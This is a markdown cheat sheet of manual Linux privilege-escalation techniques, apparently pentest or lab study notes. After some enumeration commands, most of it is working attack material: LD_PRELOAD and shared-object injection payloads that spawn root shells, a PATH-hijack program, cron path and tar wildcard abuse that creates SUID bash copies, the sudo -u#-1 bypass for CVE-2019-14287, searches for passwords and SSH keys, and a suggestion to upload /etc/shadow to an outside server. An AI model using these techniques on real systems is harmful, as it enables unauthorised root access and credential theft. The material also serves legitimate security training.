# ***Manual Linux Privilege Escalation Checks***

## System Enumeration

*Anything system related.*

### *Kernel Version*

*An outdated kernel version may lead to easy wins.*

    uname -a
    cat /proc/version
    cat /etc/issue

### *Finding the architecture*

*Knowing the architecture may come in handy if we find an exploit that requires technical specifications.*

    lscpu

### *Finding Running services*

    ps aux
    ps aux | grep root

## Network Enumeration

*Understand our IP achitecture and what we are interacting with*

    ifconfig
    ip a
    arp -a

*Identify what ports are open as well as what communications exist -- Are there ports open only internally that we are curious about?* 

    netstat -ano

## **[PASSWORDS AND FILE PERMISSIONS]**

*A password or sensitive file disclosure can give us important information.*

### *Stored Passwords*

    history
    cat .bash_history

*We can also attempt to locate the password name being searched. Think outside the box.*

For mentions of `PASSWORD=`: `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null`

For files named `password`: `locate password | more`

>We can attempt these commands with `PASSWORD=` , `passwd`, `password`, etc.

### *Weak File Permissions*

Look for **read or write** permissions to `/etc/shadow`

Look for **write** permission to `/etc/passwd`

Anything interesting in `/etc/group` ?


### *SSH Keys*

    find / -name id_rsa 2>/dev/null
    find / -name authorized_keys 2>/dev/null
    
## **[SUDO]**

*Abusing sudo to gain root.*

### *Sudo Shell Escaping*

    sudo -l

Shell escape using an exploitable binary using [GTFOBins](https://gtfobins.github.io/)

### *Intended Functionality*

Is there any intended functionality we can abuse from a sudo'able binary? Example: use `wget` to upload the `/etc/shadow` file to our private server?

### *`env_keep+=ENV_PRELOAD` is present*

*We want to use the ENV_PRELOAD feature in order to preload a malicious payload.*

1. Create the following C script named `<NAME>.so`

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile it : `gcc -fPIC -shared -o <NAME>.so <NAME>.c -nostartfiles`

3. Set LD_PRELOAD as shell.so : `sudo LD_PRELOAD=<PATH TO SHELL FILE> <ANY SUDO'ABLE COMMAND>`

### *Version Specific Exploits*

#### *Abusing CVE-2019-14287 (sudo version <1.8.28)*

[CVE-2019-14287](https://www.exploit-db.com/exploits/47502) Comes in handy if we can sudo as any user, except root (`!root`).

1. Check sudo version: `sudo -V`

2. If the sudo version is below 1.8.28, use this command to run as root: `sudo -u#-1 <COMMAND>`

#### *Abusing CVE-2019-18634 (sudo version <1.8.26)*
[Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634). Works if `pw feedback` is present.

1. Check sudo version: `sudo -V`

2. Run the exploit.

## **[SUID]**

*Abuse the SUID files to gain privs.*

### *Search for SUID Files*

    find / -perm -u=s -type f 2>/dev/null
    find / -type f -perm -04000 -ls 2>/dev/null
    
### *Share Object Injection*

Look to replace / create a file being called in a script.

```
#include <stdio.h>                                                          
#include <stdlib.h>                                                         
                                                                            
static void inject() __attribute__((constructor));                          
                                                                            
void inject() {                                                             
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); 
}
```

Compile: `gcc -shared -o <NAME>.so -fPIC <NAME>.c`

### *Binary Symlink*

[WIP]

### *Environmental Variables*

We are looking at scripts that make use of the `$PATH` shortcuts.

To see what kind of `$PATH` shortcut may be used, we can run the `strings` command to read the script.

If a shortcut is being used, we abuse the `$PATH` and "hijack" it. In order to do so, a malicious script must be ran instead of the intended command.

1. Make a malicious script named the same way as the `$PATH` command we are looking to hijack
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/<COMMAND NAME>.c`

2. Compile: `gcc /tmp/<COMMAND NAME>.c -o /tmp/<COMMAND NAME>`

3. Add /tmp to `$PATH`: `export PATH=/tmp:$PATH`

4. Run the script.

## [CAPABILITIES]

*Abuse capabilities to get higher privileges*

    getcap -r / 2>/dev/null

## [SCHEDULED TASKS]

*Abuse scheduled tasks made by a higher privileged user in order to privesc*

### *Hunt Task Schedules*

*Find scheduled tasks.*

    cat /etc/crontab
    systemctl list-timers --all
    
### *Cron Paths Abuse*

*If we have a scheduled task to run a script that doesn't use the absolute path of said script, we could possibly hijack it by creating a script of the same name at a higher priority in the PATH*

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <HIGHER PRIORITY PATH>/<SCRIPT NAME>.sh
    chmod +x <HIGHER PRIORITY PATH>/<SCRIPT NAME>.sh

### *Cron Wildcards*

*If a scheduled task uses an asterick `*` in its script, it could possibly be used to privesc. Use the following example for guidance.*

*Target cron task*
```
#!/bin/bash
cd /home/user
tar czf /tmp/backup.tar.gz *
```

*We can abuse this crontask by forcing it to run a malicious script before completing its task.*

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
chmod +x /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
```

Next, we can `/tmp/bash -p` and we will have root.


### *Cron File Overwrites*

*Overwrite / append a script used in a crontask with malicious code if we have rw access to it.*

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash >> <PATH OF OVERWRITEABLE FILE>/<OW FILE>.sh
 
 ## [NFS ROOT SQUASHING]
 
 >WIP
 
 ## [DOCKER]
 
 >WIP
